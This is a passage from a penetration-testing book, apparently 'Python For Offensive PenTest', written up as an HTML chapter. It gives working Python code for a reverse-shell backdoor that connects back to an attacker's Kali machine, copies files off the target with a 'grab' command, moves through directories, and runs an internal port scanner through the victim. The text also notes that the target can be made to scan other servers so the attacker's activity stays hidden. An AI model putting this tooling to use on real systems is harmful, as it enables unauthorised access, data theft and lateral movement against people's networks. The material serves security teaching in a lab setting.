<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Directory Navigation<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>import subprocess <br class="title-page-name"/>import os<br class="title-page-name"/><br class="title-page-name"/>def transfer(s,path):<br class="title-page-name"/>    if os.path.exists(path):<br class="title-page-name"/>        f = open(path, 'rb')<br class="title-page-name"/>        packet = f.read(1024)<br class="title-page-name"/>        while packet != '':<br class="title-page-name"/>            s.send(packet) <br class="title-page-name"/>            packet = f.read(1024)<br class="title-page-name"/>        s.send('DONE')<br class="title-page-name"/>        f.close()<br class="title-page-name"/>        <br class="title-page-name"/>    else: <br class="title-page-name"/>        s.send('Unable to find out the file')<br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>    s.connect(('10.0.2.15', 8080)) <br class="title-page-name"/> <br class="title-page-name"/>    while True: <br class="title-page-name"/>        command = s.recv(1024)<br class="title-page-name"/>        <br class="title-page-name"/>        if 'terminate' in command:<br class="title-page-name"/>            s.close()<br class="title-page-name"/>            break <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>        elif 'grab' in command: <br class="title-page-name"/>            grab,path = command.split('*')<br class="title-page-name"/>            try:<br class="title-page-name"/>                transfer(s,path)<br class="title-page-name"/>            except Exception,e:<br class="title-page-name"/>                s.send ( str(e) )<br class="title-page-name"/>                pass<br class="title-page-name"/>        <br class="title-page-name"/>        elif 'cd' in command: # the forumula here is gonna be cd then space then the path that we want to go to, like cd C:\Users<br class="title-page-name"/>            code,directory = command.split (' ') # split up the received command based on space into two variables<br class="title-page-name"/>            os.chdir(directory) # changing the directory <br class="title-page-name"/>            s.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD<br class="title-page-name"/>...</pre>
<p class="calibre2">Once we try the previous script, after typing <kbd class="calibre12">cd C:\Users</kbd>, you will be able to see whether we have changed or moved to the <kbd class="calibre12">Users</kbd> directory:</p>
<pre class="packt_figure"><strong class="calibre1">&gt;&gt;&gt;</strong><br class="title-page-name"/><strong class="calibre1">Shell&gt; cd C:\Users</strong><br class="title-page-name"/><strong class="calibre1">[+] CWD Is C:\Users</strong><br class="title-page-name"/><strong class="calibre1">&gt;&gt;&gt;</strong></pre>
<p class="calibre2">Try navigating to the location of the file that you want to <kbd class="calibre12">grab</kbd>. You will notice that, once we are on the same directory as the file we want to <kbd class="calibre12">grab</kbd>, then we don't need to specify the absolute path anymore. We can simply grab the file by specifying just the filename, as follows:</p>
<pre class="packt_figure"><strong class="calibre1">grab*Module 3.pdf </strong></pre>
<p class="calibre2">This will get us the file on the Kali machine.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Integrating low-level port scanner</h1>
                
            
            <article>
                
<p class="calibre2">During penetration testing, sometimes you encounter a scenario where your client is using some kind of an internal server that is not accessible through the internet. And just because of this they think it's secure. In this section, we will see how we can integrate a simple port scanner with our script to prevent a possible attack.</p>
<p class="calibre2">Usually, once you get into your target machine, you start looking for other possible targets. For example, if we were able to access machine A, then we can extend our attack and scan machine B to see what ports and services are running on that machine. The other usages are to make the target scan an online server on our behalf to hide our activities. Now, let's get to the coding part. We will build a basic low-level scanner. It's named low-level because we will use the built-in socket library and then build on it. The formula or the format for sending scan requests is <kbd class="calibre12">scan</kbd> followed by a space, then the IP address followed by a colon, and then the port list, for example <kbd class="calibre12">scan 10.0.2.15:22,80</kbd> :</p>
<pre class="packt_figure2"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/>#Low Level Port Scanner<br class="title-page-name"/><br class="title-page-name"/>import socket # For Building TCP Connection<br class="title-page-name"/>import subprocess # To start the shell in the system<br class="title-page-name"/>import os<br class="title-page-name"/><br class="title-page-name"/>def transfer(s,path):<br class="title-page-name"/>    if os.path.exists(path):<br class="title-page-name"/>        f = open(path, 'rb')<br class="title-page-name"/>        packet = f.read(1024)<br class="title-page-name"/>        while packet != '':<br class="title-page-name"/>            s.send(packet) <br class="title-page-name"/>            packet = f.read(1024)<br class="title-page-name"/>        s.send('DONE')<br class="title-page-name"/>        f.close()<br class="title-page-name"/>        <br class="title-page-name"/>    else: # the file doesn't exist<br class="title-page-name"/>        s.send('Unable to find out the file')<br class="title-page-name"/>...</pre>
<p class="calibre2">Now, the first thing to do is to cut off the leading first character, so this part will be removed. After that, we will split the right part into two sections. The first section is the IP address that we want to scan, and we will store it in the<span class="calibre11"> </span><kbd class="calibre12">ip</kbd><span class="calibre11"> </span>variable. The second section is the list of ports for which we want to check the access status, and it will be saved in the<span class="calibre11"> </span><kbd class="calibre12">ports</kbd><span class="calibre11"> </span>variable. To keep the coding clean, an entire function called scanner is there to do our stuff. So, we will pass the<span class="calibre11"> </span><kbd class="calibre12">socket</kbd><span class="calibre11"> </span>object, the<span class="calibre11"> </span><kbd class="calibre12">ip</kbd>, and the<span class="calibre11"> </span><kbd class="calibre12">ports</kbd><span class="calibre11"> </span>variables to this function.</p>
<p class="calibre2">Once we get these variables, we will define<span class="calibre11"> </span><kbd class="calibre12">scan_result</kbd><span class="calibre11"> </span>as a variable, which stores our scanning result. Now, remember that the ports are separated by a comma, like this:<span class="calibre11"> </span><kbd class="calibre12">21, 22, 80, 443, 445</kbd>, for example. So what we will do is, we will loop over each one of these ports and try to make a connection using a<span class="calibre11"> </span><kbd class="calibre12">socket</kbd><span class="calibre11"> </span>library for each one of them. Notice that I have used the <kbd class="calibre12">connect_ex()</kbd><span class="calibre11"> </span>function, where the function returns<span class="calibre11"> </span><kbd class="calibre12">0</kbd><span class="calibre11"> </span>if the operation succeeds. And, in our case, the operation succeeded, which means that the connection happens and that the port is open. Otherwise, the port would be closed or the host would be unreachable in the first place. In the end, we will close the socket and repeat the whole process until the last port in our list here.</p>
<pre class="packt_figure2">...<br class="title-page-name"/>def scanner(s,ip,ports):<br class="title-page-name"/>    <br class="title-page-name"/>    scan_result = '' # scan_result is a variable stores our scanning result<br class="title-page-name"/>    <br class="title-page-name"/>    for port in ports.split(','): # remember the ports are separated by a comma in this format 21,22,..<br class="title-page-name"/>        <br class="title-page-name"/>        try: # we will try to make a connection using socket library for EACH one of these ports<br class="title-page-name"/>            <br class="title-page-name"/>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>            output = sock.connect_ex((ip, int(port) )) #connect_ex This function returns 0 if the operation succeeded, and in our case operation succeeded means that <br class="title-page-name"/>        #the connection happens which means the port is open otherwise the port could be closed or the host is unreachable in the first place.<br class="title-page-name"/>            <br class="title-page-name"/>            if output == 0:<br class="title-page-name"/>                scan_result = scan_result + "[+] Port " +port+ " is opened" +'\n'<br class="title-page-name"/><br class="title-page-name"/>            else:<br class="title-page-name"/>                scan_result = scan_result + "[-] Port " +port+" is closed or Host is not reachable" +'\n'<br class="title-page-name"/>                <br class="title-page-name"/>            sock.close()<br class="title-page-name"/>    <br class="title-page-name"/>        except Exception, e:<br class="title-page-name"/>            pass<br class="title-page-name"/>    s.send (scan_result) # finally we send the result back to our kali<br class="title-page-name"/>...</pre>
<p class="calibre2"><span class="calibre11">So we'll go for port </span><kbd class="calibre12">22</kbd><span class="calibre11"> until we reach the last one. The result of our scan will be stored in </span><kbd class="calibre12">scan_result</kbd><span class="calibre11">, and the </span><kbd class="calibre12">+</kbd><span class="calibre11"> sign is used to append the result. Finally, we send back the result to our Kali machine. Since our Kali machine and the target are on the same virtual subnet here, we should appear on the target <kbd class="calibre12">arp</kbd> table.</span></p>
<p class="calibre2">Lets proceed to the rest of the code:</p>
<pre class="packt_figure2">...<br class="title-page-name"/>def connect():<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>    s.connect(('10.0.2.15', 8080))<br class="title-page-name"/> <br class="title-page-name"/>    while True: # keep receiving commands from the Kali machine<br class="title-page-name"/>        command = s.recv(1024)<br class="title-page-name"/>        <br class="title-page-name"/>        if 'terminate' in command:<br class="title-page-name"/>            s.close()<br class="title-page-name"/>            break # close the socket<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>        elif 'grab' in command: # grab*C:\Users\Hussam\Desktop\photo.jpeg<br class="title-page-name"/>            grab,path = command.split('*')<br class="title-page-name"/>            try:<br class="title-page-name"/>                transfer(s,path)<br class="title-page-name"/>            except Exception,e:<br class="title-page-name"/>                s.send ( str(e) )<br class="title-page-name"/>                pass<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>        elif 'scan' in command: # syntax: scan 10.0.2.15:22,80<br class="title-page-name"/>            command = command[5:] # cut off the leading first 5 char <br class="title-page-name"/>            ip,ports = command.split(':') # split the output into two sections where the first variable is the ip which we want to scan and the second variable is the list of ports<br class="title-page-name"/>                                          # that we want to check its status<br class="title-page-name"/>            scanner(s,ip,ports)<br class="title-page-name"/>            <br class="title-page-name"/>...</pre>
<p class="calibre2">On running our scripts on both sides, we will do an <kbd class="calibre12">arp -a</kbd> and this will give the IP address of our Kali machine: <kbd class="calibre12">10.0.2.15</kbd>. So, as a proof of concept, we can scan our Kali machine from the target side and run Wireshark to confirm the scanning:</p>
<pre class="packt_figure"><strong class="calibre1">scan 10.0.2.15:21,23,80,443,445,137,138,8080<br class="title-page-name"/></strong></pre>
<p class="calibre2">Once we run Wireshark and filter on TCP, we can see that the TCP session comes over. In the scan result, we can see that port <kbd class="calibre12">8080</kbd> is opened and all others are closed:</p>
<pre class="packt_figure"><strong class="calibre1">&gt;&gt;&gt;</strong><br class="title-page-name"/><strong class="calibre1">[-] Port 21 is closed or Host is not reachable</strong><br class="title-page-name"/><strong class="calibre1">[-] Port 23 is closed or Host is not reachable</strong><br class="title-page-name"/><strong class="calibre1">[-] Port 80 is closed or Host is not reachable</strong><br class="title-page-name"/><strong class="calibre1">[-] Port 443 is closed or Host is not reachable</strong><br class="title-page-name"/><strong class="calibre1">[-] Port 445 is closed or Host is not reachable</strong><br class="title-page-name"/><strong class="calibre1">[-] Port 137 is closed or Host is not reachable</strong><br class="title-page-name"/><strong class="calibre1">[-] Port 139 is closed or Host is not reachable</strong><br class="title-page-name"/><strong class="calibre1">[+] Port 8080 is opened</strong><br class="title-page-name"/><strong class="calibre1">&gt;&gt;&gt;</strong></pre>
<p class="calibre2">We can check the completed three-way handshake for TCP on port <kbd class="calibre12">8080</kbd>. We can see the <kbd class="calibre12">[SYN]</kbd>, <kbd class="calibre12">[SYN, ACK]</kbd>, then <kbd class="calibre12">[ACK]</kbd> that complete the three-way handshake; and we can see that the target, after completing the three-way handshake, sends a <kbd class="calibre12">[FIN]</kbd> request to close the socket here because we opted to close the socket after scanning. If you still remember, in the code here we said <kbd class="calibre12">sock.close()</kbd>. So <kbd class="calibre12">[FIN]</kbd> acts as an indicator to close the socket.</p>
<p class="calibre2">Now to double-check, we can open a terminal to see what process is using port <kbd class="calibre12">8080</kbd>:</p>
<pre class="packt_figure"><strong class="calibre1">netstat -antp | grep "8080"</strong></pre>
<p class="calibre2">We will see that it's opened by another Python script. But if we do the same for port <kbd class="calibre12">21</kbd>, we will get nothing since the port is closed.</p>
<p class="calibre2">Let's do another test: we will use a <kbd class="calibre12">netcat</kbd> to open port <kbd class="calibre12">21</kbd>:</p>
<pre class="packt_figure"><strong class="calibre1">ncat -lvp 21</strong></pre>
<p class="calibre2">Then, I will do the scan again to see whether the result is going to change. Right now, we are listening on port <kbd class="calibre12">21</kbd> since it's opened.  So if we go back to our shell, and then repeat the same scan; if it's working, we should see port <kbd class="calibre12">21</kbd> open.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Summary</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we learned about DDNS and the DDNS-aware shell. We also learned how to interact with Twitter, and replicate Metasploit's screen capturing, and we searched for the content and looked into target directory navigation. Last, we saw how to integrate a low-level port scanner.</p>
<p class="calibre2">In the next chapter, we will learn about password hacking.</p>


            </article>

            
        </section>
    </body></html>